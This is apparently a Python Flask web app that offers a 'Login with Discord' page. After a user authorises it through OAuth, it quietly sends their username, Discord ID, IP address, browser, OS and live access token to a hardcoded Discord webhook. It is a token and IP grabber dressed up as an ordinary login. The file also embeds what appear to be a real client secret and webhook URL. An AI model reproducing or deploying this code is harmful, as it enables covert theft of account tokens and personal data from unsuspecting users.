from flask import Flask, request, jsonify, redirect, session
import requests
from datetime import datetime
from user_agents import parse
import secrets
import logging

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

CLIENT_ID = "1347985364761051236"
CLIENT_SECRET = "uzv5NE7xacUgYgE_NE978mp9Z7AvjgMt"
REDIRECT_URI = "http://localhost:5000/auth"

WEBHOOK_URL = "https://discord.com/api/webhooks/1347993283808329821/PfoYChFYMIYchIUFuWJr3YwEcMb411kXJteJsQeEmGidhA6gkkeo9LBm-XnVsDJ2t-h3"

DISCORD_AUTH_URL = (
    f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}"
    f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
)

logging.basicConfig(level=logging.DEBUG)

@app.route("/")
def index():
    return '<a href="/login">Login with Discord</a>'

@app.route("/login")
def login():
    return redirect(DISCORD_AUTH_URL)

@app.route("/auth")
def auth():
    code = request.args.get("code")
    if not code:
        logging.error("Authorization failed: No code provided.")
        return "Authorization failed: No code provided."

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    if response.status_code != 200:
        logging.error(f"Failed to get access token: {response.json()}")
        return jsonify({"error": "Failed to get access token", "details": response.json()}), 500

    access_token = response.json().get("access_token")
    if not access_token:
        logging.error("No access token returned.")
        return "Authorization failed: No access token."

    headers = {"Authorization": f"Bearer {access_token}"}
    user_response = requests.get("https://discord.com/api/users/@me", headers=headers)

    if user_response.status_code != 200:
        logging.error(f"Failed to fetch user info: {user_response.json()}")
        return "Authorization failed: Could not fetch user information."

    user_info = user_response.json()
    discord_username = f"{user_info['username']}#{user_info['discriminator']}"
    discord_id = user_info["id"]

    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = parse(request.headers.get("User-Agent", ""))

    embed = {
        "content": "New Discord Login!",
        "embeds": [{
            "title": "User Information",
            "fields": [
                {"name": "Username", "value": discord_username, "inline": True},
                {"name": "Discord ID", "value": discord_id, "inline": True},
                {"name": "IP Address", "value": user_ip, "inline": False},
                {"name": "Browser", "value": f"{user_agent.browser.family} {user_agent.browser.version_string}", "inline": True},
                {"name": "OS", "value": f"{user_agent.os.family} {user_agent.os.version_string}", "inline": True},
                {"name": "Device", "value": user_agent.device.family, "inline": True},
                {"name": "Access Token", "value": access_token, "inline": False}
            ],
            "timestamp": datetime.utcnow().isoformat()
        }]
    }

    requests.post(WEBHOOK_URL, json=embed)

    return f"Login successful! Welcome {discord_username}. Your Discord Access Token: {access_token}"

def handler(request):
    return app(request)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
